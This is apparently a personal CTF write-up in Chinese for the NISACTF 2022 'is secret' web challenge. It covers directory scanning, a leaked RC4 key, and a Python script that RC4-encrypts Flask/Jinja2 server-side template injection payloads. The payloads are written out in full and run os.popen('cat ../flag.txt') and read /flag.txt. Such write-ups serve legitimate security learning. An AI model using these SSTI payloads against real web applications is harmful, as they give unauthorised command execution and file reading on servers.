# 【NISACTF 2022】is Secret


# [NISACTF 2022]is secret

## 思路
* 进入没信息，用dirsearch扫网站
* 发现可以传参，?secret=32423452523
* 报错后发现源码泄露
  * 存在一个RC4加密（看到密钥）
  * 存在SSTI模板注入

* 使用脚本把secret内容加密传入（RC4是对称加密）
* 使用SSTI-Flask模板注入

## EXP
- RC4加密代码

&gt; 找了大佬的

```
import base64
from urllib.parse import quote
def rc4_main(key = &#34;init_key&#34;, message = &#34;init_message&#34;):
    # print(&#34;RC4加密主函数&#34;)
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return  crypt
def rc4_init_sbox(key):
    s_box = list(range(256))
    # print(&#34;原来的 s 盒：%s&#34; % s_box)
    j = 0
    for i in range(256):
        j = (j &#43; s_box[i] &#43; ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    # print(&#34;混乱后的 s 盒：%s&#34;% s_box)
    return s_box
def rc4_excrypt(plain, box):
    # print(&#34;调用加密程序成功。&#34;)
    res = []
    i = j = 0
    for s in plain:
        i = (i &#43; 1) % 256
        j = (j &#43; box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] &#43; box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    cipher = &#34;&#34;.join(res)
    print(&#34;加密后的字符串是：%s&#34; %quote(cipher))
    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))
#固定rc4
rc4_main(&#34;HereIsTreasure&#34;,&#34;{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat ../flag.txt&#39;).read()}}&#34;)
#{{&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/flag.txt&#39;).read()}}
```

- SSTI模板注入
- 找到os命令执行`{{&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/flag.txt&#39;).read()}}`

## 总结
* 信息查找
* RC4加密
* SSTI模板注入

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-nisactf-2022is-secret/  

